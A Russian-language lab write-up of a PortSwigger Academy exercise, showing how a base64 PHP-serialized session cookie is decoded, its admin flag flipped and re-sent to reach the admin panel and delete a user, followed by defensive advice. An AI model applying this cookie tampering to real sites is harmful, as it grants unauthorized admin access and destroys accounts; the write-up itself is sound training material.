теория с примерами тут [[theory_insecureDeserialization+Object+Injection]]

-------

лаба https://portswigger.net/web-security/deserialization/exploiting/lab-deserialization-modifying-serialized-objects
#### Modifying serialized objects

задание изи
нереалистичное
1 перехват десириализ обьекта
2 его модификация для доступа к админке
3 удалить карлоса

-----
приступим!

выполнил вход на сайт
тут приходит такая шляпа десириализованная и кодированная через- base 64 кодировка

![[deserias01001.png]]

```http
HTTP/2 302 Found
Location: /my-account?id=wiener
Set-Cookie: session=Tzo0OiJVc2VyIjoyOntzOjg6InVzZXJuYW1lIjtzOjY6IndpZW5lciI7czo1OiJhZG1pbiI7YjowO30%3d; Secure; HttpOnly; SameSite=None
X-Frame-Options: SAMEORIGIN
Content-Length: 0

после расшифровки

O:4:"User":2:{s:8:"username";s:6:"wiener";s:5:"admin";b:0;}
```

юезер
имя
роль админ 0 то есть false 

нужно поставить в тру

вот так

```
O:4:"User":2:{s:8:"username";s:6:"wiener";s:5:"admin";b:1;}
```

-----

эта же шляпа при обновлении страницы отправляется на сервер

![[deserias0202020203.png]]

подменю запрос с такими данными

```
O:4:"User":2:{s:8:"username";s:6:"wiener";s:5:"admin";b:1;}
```

кодирую

base64
```

Tzo0OiJVc2VyIjoyOntzOjg6InVzZXJuYW1lIjtzOjY6IndpZW5lciI7czo1OiJhZG1pbiI7YjoxO30=
```


-------
получил доступ к админке, но сами действия просто так не работают, видимо нужно везде передавать этот сериализ обьект

![[fdes03030334.png]]

--------

перехват тапа по админке
```http
GET /admin HTTP/2
Host: 0ac400b60443285b801d5384006600d2.web-security-academy.net
Cookie: session=Tzo0OiJVc2VyIjoyOntzOjg6InVzZXJuYW1lIjtzOjY6IndpZW5lciI7czo1OiJhZG1pbiI7YjowO30%3d
Sec-Ch-Ua: "Chromium";v="145", "Not:A-Brand";v="99"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "macOS"
Accept-Language: ru-RU,ru;q=0.9
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/145.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: https://0ac400b60443285b801d5384006600d2.web-security-academy.net/my-account?id=wiener
Accept-Encoding: gzip, deflate, br
Priority: u=0, i


```

получаю доступ к функциям!

![[deser00404040405.png]]

---------

вот эти ссылки для удаления

```html
                           <span>wiener - </span>
                            <a href="/admin/delete?username=wiener">Delete</a>
                        </div>
                        <div>
                            <span>carlos - </span>
                            <a href="/admin/delete?username=carlos">Delete</a>
                        </div>
                    </section>
                    <br>
                    <hr>
```

нужно
 /admin/delete?username=carlos

## готово!!! лаба решена!
![[deser050505005054.png]]

оч просто все тут было

## защититься как ?

никогда не доверять данным от юзера, это главное правило, любой сериализованный объект пришедший от клиента (в куке, скрытом поле, параметре) потенциальная бомба

использовать цифровую подпись, если без сериализации не обойтись, подписывайте объекты секретным ключом (hmac), тогда сервер сможет проверить не изменял ли кто данные в пути, но ключ должен быть действительно секретным и сложным

белый список классов, запрещать все классы кроме строго необходимых, если приложение ожидает объект типа user а ты пытаешься скормить ему systemcommandexecutor сервер должен послать тебя нахуй

мониторинг и логирование, отслеживать аномалии: неожиданные типы объектов, исключения при десериализации, это поможет вовремя обнаружить атаку

не использовать нативные форматы, json и xml (с правильной настройкой, без разрешения смены типов) безопаснее чем php-сериализация java readobject или python pickle

регулярно обновлять библиотеки, старые версии commons collections jackson pyyaml содержат гаджеты которые позволяют выполнить код на сервере